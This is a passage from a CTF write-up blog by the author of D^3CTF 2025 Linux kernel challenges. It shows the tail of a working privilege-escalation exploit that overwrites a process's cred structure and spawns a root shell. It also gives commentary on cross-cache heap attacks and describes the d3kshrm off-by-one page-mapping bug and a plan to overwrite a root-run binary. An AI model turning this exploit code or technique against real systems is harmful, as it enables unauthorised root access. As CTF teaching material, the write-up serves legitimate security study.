&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                INFO_MSG(<span class="string">&quot;[*] Leak secondary_startup_64 : &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,kernel_leak</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got kernel base: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>, kernel_base);</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got vmemmap_base: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>, vmemmap_base);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[?] Got leak: %lx\n&quot;</span>, kernel_leak);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(</span><br><span class="line">            <span class="string">&quot;[No.%d loop] Got unmatched data: %lx, keep looping...&quot;</span>,</span><br><span class="line">            loop_nr,</span><br><span class="line">            kernel_leak</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        vmemmap_base -= KASLR_GRANULARITY;</span><br><span class="line">        arbitrary_read_by_pipe(</span><br><span class="line">            vmemmap_base + <span class="number">0x9d000</span> / <span class="number">0x1000</span> * <span class="number">0x40</span>,</span><br><span class="line">            buf,</span><br><span class="line">            <span class="number">0xff0</span>,</span><br><span class="line">            atk_msgq,</span><br><span class="line">            msg_buf,</span><br><span class="line">            MSG_SPRAY_SZ,</span><br><span class="line">            MSG_TAG_BASE</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Seeking task_struct in kernel space...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line">    uid = getuid();</span><br><span class="line">    gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">        arbitrary_read_by_pipe(</span><br><span class="line">            vmemmap_base + i * <span class="number">0x40</span>,</span><br><span class="line">            buf,</span><br><span class="line">            <span class="number">0xff0</span>,</span><br><span class="line">            atk_msgq,</span><br><span class="line">            msg_buf,</span><br><span class="line">            MSG_SPRAY_SZ,</span><br><span class="line">            MSG_TAG_BASE</span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">        comm_addr = memmem(buf, <span class="number">0xff0</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-2</span>] == comm_addr[<span class="number">-3</span>])) &#123;  <span class="comment">/* should be equal */</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                SUCCESS_MSG(<span class="string">&quot;[+] Found task_struct on page: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,</span><br><span class="line">                (vmemmap_base + i * <span class="number">0x40</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got cred address: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,comm_addr[<span class="number">-2</span>]);</span><br><span class="line"></span><br><span class="line">            cred_kaddr = comm_addr[<span class="number">-2</span>];</span><br><span class="line">            cred_data = (<span class="type">void</span>*) (cred_data_buf + (cred_kaddr &amp; (<span class="number">0x1000</span> - <span class="number">1</span>)));</span><br><span class="line">            page_offset_base = cred_kaddr &amp; KASLR_MASK;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                cred_kpage_addr = vmemmap_base + \</span><br><span class="line">                                (cred_kaddr - page_offset_base) / <span class="number">0x1000</span> * <span class="number">0x40</span>;</span><br><span class="line">            </span><br><span class="line">                arbitrary_read_by_pipe(</span><br><span class="line">                    cred_kpage_addr,</span><br><span class="line">                    cred_data_buf,</span><br><span class="line">                    <span class="number">0xff0</span>,</span><br><span class="line">                    atk_msgq,</span><br><span class="line">                    msg_buf,</span><br><span class="line">                    MSG_SPRAY_SZ,</span><br><span class="line">                    MSG_TAG_BASE</span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">if</span> (cred_data-&gt;uid == uid</span><br><span class="line">                    &amp;&amp; cred_data-&gt;gid == gid) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(</span><br><span class="line">                        SUCCESS_MSG(<span class="string">&quot;[+] Got page_offset_base: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,</span><br><span class="line">                        page_offset_base</span><br><span class="line">                    );</span><br><span class="line">                    <span class="built_in">printf</span>(</span><br><span class="line">                        SUCCESS_MSG(<span class="string">&quot;[+] Found cred on page: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,</span><br><span class="line">                        cred_kpage_addr</span><br><span class="line">                    );</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                page_offset_base -= KASLR_GRANULARITY;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;[?] Looping!?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Overwriting cred and granting root privilege...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cred_data-&gt;uid = <span class="number">0</span>;</span><br><span class="line">    cred_data-&gt;gid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe(</span><br><span class="line">        cred_kpage_addr,</span><br><span class="line">        cred_data_buf,</span><br><span class="line">        <span class="number">0xff0</span>,</span><br><span class="line">        atk_msgq,</span><br><span class="line">        msg_buf,</span><br><span class="line">        MSG_SPRAY_SZ,</span><br><span class="line">        MSG_TAG_BASE</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(SUCCESS_MSG(<span class="string">&quot;-------- D^3CTF2025::Pwn - d3kheap2 --------&quot;</span>) <span class="string">&quot;\n&quot;</span></span><br><span class="line">    INFO_MSG(<span class="string">&quot;--------    Official Exploitation   --------\n&quot;</span>)</span><br><span class="line">    INFO_MSG(<span class="string">&quot;--------      Author: &quot;</span>)<span class="string">&quot;arttnba3&quot;</span>INFO_MSG(<span class="string">&quot;      --------&quot;</span>) <span class="string">&quot;\n&quot;</span></span><br><span class="line">    SUCCESS_MSG(<span class="string">&quot;-------- Local Privilege Escalation --------\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    banner();</span><br><span class="line">    exploit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="What’s-more…"><a href="#What’s-more…" class="headerlink" title="What’s more…"></a>What’s more…</h2><p>The introduction is modified from one of my favourite song when I was not <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=LHCob76kigA">7 years</a> old but 15 years old, which will always remind me a lot about my teenage years. I hope that this could remind you about how further the Linux kernel exploitation step out compared to the old <a target="_blank" rel="noopener" href="https://github.com/arttnba3/D3CTF2022_d3kheap">d3kheap</a> in D^3CTF 2022. With the amazing cross-cache attack we can almost exploit every UAF and DF vulnerabilities by transfering the SLUB pages from one <code>kmem_cache</code> to another. That’s the reason why I named it as <code>d3kheap2</code> : <strong>Solution upgration from limited one for d3kheap’s easy double free to general one for d3kheap2’s lunatic double free</strong>.</p>
<p>Although the core technique for this challenge this is not a new technique in 2025 (which can even be backed to at least <a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-22/Thursday/US-22-WANG-Ret2page-The-Art-of-Exploiting-Use-After-Free-Vulnerabilities-in-the-Dedicated-Cache.pdf">2022</a>, but I don’t know whether it’s the oldest public one), but cross-cache attack is not common in CTF in the past few years. Therefore I choose to present this technique in this year’s D^3CTF, as I’m busy in 2024 and do not present anything at that year, and in 2023 I’ve presented <a target="_blank" rel="noopener" href="https://github.com/arttnba3/D3CTF2023_d3kcache">something else</a> (which was <strong>plagiarized</strong> one year later on <a target="_blank" rel="noopener" href="https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf">BlackHat USA 2024</a> by a student called <a target="_blank" rel="noopener" href="https://github.com/Lotuhu">Jiayi Hu</a> who participated in that competition).</p>
<p>Another reason I finally chose the cross-cache attack is that <em>I did not have too much time on completing these challenges.</em> As I’ve graduated from my undergraduate, I did not pay too much attention on how my junior schoolmates prepared for this year’s D^3CTF, and get to know that almost no pwn challenges were created j<strong>ust at about 10 days before the competition started</strong> . Therefore I have to stand out to rush to create the pwn challenges with almost nothing new in research in my mind to make sure the competition can be held normally as past years. <strong>Sorry and I apologize that I didn’t bring something that is as same cool as the d3kcache in 2023.</strong> But luckily I still have something special for you, which is how I manipulate with <code>msg_msg</code> and <code>pipe_buffer</code> : <em>tricky but useful gadgets you may be love in</em>.</p>
<p>And if you pay enough attention to the kernel itself, you may notice that I didn’t enable the <code>CONFIG_SLAB_BUCKETS</code> configuration as what <a target="_blank" rel="noopener" href="https://github.com/arttnba3/D3CTF2025_d3kshrm">d3kshrm</a>‘s kernel does, which is a mitigation against the heap spraying. Although it is not difficult to bypass this mitigation by doing the full heap spraying instead of doing the precise object allocation, as the D^3CTF this year is only planned to be 24 hours, I hope that this challenge could be the one for you to do the “sign in” for pwn easily, just like the old introduction of <code>d3kheap</code> back to D^3CTF 2022. Therefore this challenge is originally designed to not be with an extremely high difficulty.</p>
<p>For the final result of this challenge, most of players had adopted the expected solution, which is to do the cross-cache attack as my expectation. I’m happy to see that many of participated CTFers have known how to take advantage of such advanced techniques to do the exploitation, which can be thought to be the general approach for almost arbitrary heap vulnerabilities. As the cross-cache attack has been widely used in recent years, I’m convince that this must be or even have already become the base strategy and the standard start point for doing the Linux kernel exploitation towards heap vulnerabilities. There is a pity is that I FORGOT to turn the <code>CONFIG_MEMCG</code> on to separate <code>GFP_KERNEL</code> and <code>GFP_KERNEL_ACCOUNT</code> into different <code>kmem_cache</code>, as you can see that I have adopted a multi-stage exploitation that manipulate with <code>msg_msg</code> and <code>pipe_buffer</code> heavily, while some players just simply use the <code>sk_buff</code> to read and write the UAF pipe_buffer directly. Another pity is that the team <a target="_blank" rel="noopener" href="https://w0y.at/">We_0wn_y0u</a> who got the first blood for d3kheap2 had ONLY done the d3kheap2 in the D^3CTF 2025 and seems to be disappeared after that, and I temporarily don’t know their detailed solution.</p>
<p>Now let’s talk about those <strong>State-Of-The-Art academic techniques</strong> like Dirty PageTable (<a target="_blank" rel="noopener" href="https://www.usenix.org/conference/usenixsecurity24/presentation/maar-slubstick">SLUBStick</a>, <em>I don’t know why we have two names here and I’m still not sure whether the author is the same</em> , as the original blog of the Dirty PageTable had been removed, and I did not have to much time to distinguish) and <a target="_blank" rel="noopener" href="https://www.usenix.org/conference/usenixsecurity24/presentation/guo-ziyi">DirtyPage</a> (also named Page Spray by its authors) <strong>whose base technique is also the cross-cache attack</strong> : Are they powerful and capable enough to be used in this challenge? The answer seems to be NOT EASY, as such approaches are designed for different vulnerability patterns.</p>
<ul>
<li>For the SLUBStick, we will need additional capabilities to do the <strong>UAF write</strong> for at least several times, which require us to construct complex and multi-stage cross-cache page freeing and reclaiming, rising the difficulty of constructing the exploitation to a high level while lower down the usability and stability. </li>
<li>DirtyPage says that “it takes a further step” by confusing the object counting on a SLUB (refer to its <code>Figure 1: Page Spray Exploit Model for Double Free.</code>), however it is <strong>useless</strong> to overwrite an object with no functionalities. In my opinion it might be more capable for attacking those kernel objects with specific functionalities (like <code>file</code> or <code>pipe_buffer</code>?), but if the target object lacks enough capabilities for the later attacking stages, such exploitation might not be able to be applied.</li>
</ul>
<p>Hence, <strong>pure cross-cache attack might be more capable and usable for d3kheap2 in my thoughts</strong> , but anyway thanks to them for developing such powerful exploitation techniques that have brought our views to another different aspect.</p>
<p>Another point is that assistant techniques like timing side-channel attack to predict the time of allocating SLUB pages like the Pspray do not have too much effects for the general kernel heap exploitation not limited to the <code>d3kheap2</code>. A core reason is that with the existence of mitigation like <code>CONFIG_RANDOM_KMALLOC_CACHES</code> in the kernel mainline, it does not mean to be important for us to know whether ONE NEW SLUB pages has been allocated. As our object allocation will always comes from different dedicated pools randomly, doing the heap spray with approximate estimation seems to be the only capable solution, and doing the precise allocation has become almost impossible. Though this mitigation was not enabled in the <code>d3kheap2</code>, I still want to talk about something more related to the real-world exploitation. Hope that you will not mind : )</p>
<p>Though I still have many thoughts about the Linux kernel exploitation, but it seems that this passage has become too long at this moment, so let’s just stop here. Anyway I would like to thank everyone who has participated in this CTF and has tried to solve my challenge, no matter you’ve got the flag or not. I’m still so sorry that I did not present you with something as cool as the <a target="_blank" rel="noopener" href="https://github.com/arttnba3/D3CTF2023_d3kcache">d3kcache</a> due to multiple reasons including limited time, hope that you will not mind : )</p>
<h1 id="0x02-D3KSHRM-1-Solve"><a href="#0x02-D3KSHRM-1-Solve" class="headerlink" title="0x02. D3KSHRM | 1 Solve"></a>0x02. D3KSHRM | 1 Solve</h1><p>You can get the original attachment at <a target="_blank" rel="noopener" href="https://github.com/arttnba3/D3CTF2025_d3kshrm">https://github.com/arttnba3/D3CTF2025_d3kshrm</a>.</p>
<p>You know what? Sharing is always a good moral quality. That’s the reason why I’m going to share some of my precious memories with all of you!</p>
<blockquote>
<p>Copyright(c) 2025 &lt;ディーキューブ・シーティーエフ カーネル Pwn 製作委員会&gt;</p>
<p>Author: arttnba3 @ L-team x El3ctronic x D^3CTF</p>
</blockquote>
<h2 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00. Introduction"></a>0x00. Introduction</h2><p>In this challenge we created a kernel module named <code>d3kshrm.ko</code> , which can provide users with functionalities to create shared memory. Through the <code>ioctl()</code> interface we have the following capabilities:</p>
<ul>
<li>Create a new shared memory with specific size</li>
<li>Bind to an existed shared memory</li>
<li>Unbind from current shared memory</li>
<li>Delete an existed shared memory</li>
</ul>
<p>And to access the shared memory, we can map the file descriptor after binding it, where the vulnerability locates. Due to the lack of checking on the bound of  <code>d3kshrm::pages</code>, an attacker can treat the next 8 bytes next to the <code>d3kshrm::pages</code> as a pointer to <code>struct page</code> and map it to the user address space.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">vm_fault_t</span> <span class="title function_">d3kshrm_vm_fault</span><span class="params">(<span class="keyword">struct</span> vm_fault *vmf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3kshrm_struct</span> *<span class="title">d3kshrm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">    <span class="type">vm_fault_t</span> res;</span><br><span class="line"></span><br><span class="line">    vma = vmf-&gt;vma;</span><br><span class="line">    d3kshrm = (<span class="keyword">struct</span> d3kshrm_struct *) vma-&gt;vm_private_data;</span><br><span class="line"></span><br><span class="line">    spin_lock(&amp;d3kshrm-&gt;lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* vulnerability here */</span></span><br><span class="line">    <span class="comment">// if (vmf-&gt;pgoff &gt;= d3kshrm-&gt;page_nr) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (vmf-&gt;pgoff &gt; d3kshrm-&gt;page_nr) &#123;</span><br><span class="line">        res = VM_FAULT_SIGBUS;</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_page(d3kshrm-&gt;pages[vmf-&gt;pgoff]);</span><br><span class="line">    vmf-&gt;page = d3kshrm-&gt;pages[vmf-&gt;pgoff];</span><br><span class="line">    res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ret:</span><br><span class="line">    spin_unlock(&amp;d3kshrm-&gt;lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>As the <code>d3kshrm::pages</code> will be allocated from an isolated <code>kmem_cache</code>, we have to use page-level heap fengshui to manipulate page-level memory to try to map page pointers outside the challenge functionalities, which is because we can not exploit pages directly by double-mapping as the reference number exists as guard to prevent us to create page-level double free directly. Hence our available exploitation strategy is to map those pages originally with read-only permissions to the user space, which will remind us of the <a target="_blank" rel="noopener" href="https://github.com/arttnba3/Linux-kernel-exploitation/tree/main/CVE/CVE-2023-2008">CVE-2023-2008</a> that also abusing out-of-bound page mapping to do the DirtyPage-like attack. Here comes our exploitation strategy:</p>
<ul>
<li>Use page-level heap fengshui to re-arrange page-level memory to put the SLUB pages of the isolated <code>kmem_cache</code> of the challenge between two SLUB pages of the victim objects. Here we chose the <code>pipe_buffer</code> as the victim as it has a pointer to the <code>struct page</code> at the start of the structure, which makes us possible to do the out-of-bound mapping.</li>
<li>Open the file with read-only permission and use <code>splice()</code> function to store the first page of the target file into the <code>pipe_buffer</code>.</li>
<li>Exploit the vulnerability to do the out-of-bound page mapping to map the page originally with read-only permission to the user space with read &amp; write permissions. Hence the power of overwriting read-only file will be granted to us.</li>
</ul>
<p>I finally chose the <code>/sbin/poweroff</code> (which is the symbolic to the <code>busybox</code>) as our victim file, as the final line of the <code>/etc/init.d/rcS</code> is to execute the <code>/sbin/poweroff</code> with root privilege, which will grant us with the power to execute arbitrary code with root privilege. The final exploitation is in <code>exo.c</code> in this repository, whose successful rate is at approximately <code>84.63%</code> (result after more than 2048 times automatic local test), and I’m convinced that there must be a room to rise it to over <code>95%+</code> as I hadn’t adopt complex and advanced page-level heap fengshui procedure yet.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span 